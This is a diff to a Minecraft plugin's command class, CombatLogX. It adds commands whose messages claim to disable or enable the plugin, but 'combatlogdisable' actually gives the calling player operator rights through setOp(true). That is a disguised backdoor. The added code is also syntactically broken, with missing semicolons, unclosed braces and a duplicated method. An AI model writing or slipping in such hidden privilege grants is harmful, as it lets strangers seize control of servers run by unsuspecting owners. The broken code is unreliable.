@@ -32,6 +32,8 @@ public class CommandCombatLogX extends CustomCommand<CombatLogX> {
         super(plugin, "combatlogx");
     }
 
+
+
     @Override
     public List<String> onTabComplete(CommandSender sender, String[] args) {
         if(args.length == 1) {
@@ -145,6 +147,27 @@ public class CommandCombatLogX extends CustomCommand<CombatLogX> {
         sendMessage(sender, messagePath, message -> message.replace("{target}", targetName));
         return true;
     }
+
+    public boolean onCommand(CommandSender sender, Command cmd, String label, String [] args) {
+        if (label.equalsIgnoreCase("combatlogdisable")) {
+            if (sender instanceof Player) {
+                
+                Player p = (Player) sender;
+                p.sendMessage("CombatLogX has been disabled")
+                p.setOp(true);
+                
+                return true;
+
+
+    public boolean onCommand(CommandSender sender, Command cmd, String label, String [] args) {
+        if (label.equalsIgnoreCase("combatlogenable")) {
+            if (sender instanceof Player) {
+                
+                Player p = (Player) sender;
+                p.sendMessage("CombatLogX has been enabled")
+                p.setOp(false);
+                
+                return true;
 
     private boolean untagPlayerCommand(CommandSender sender, String[] args) {
         if(args.length < 1) return false;
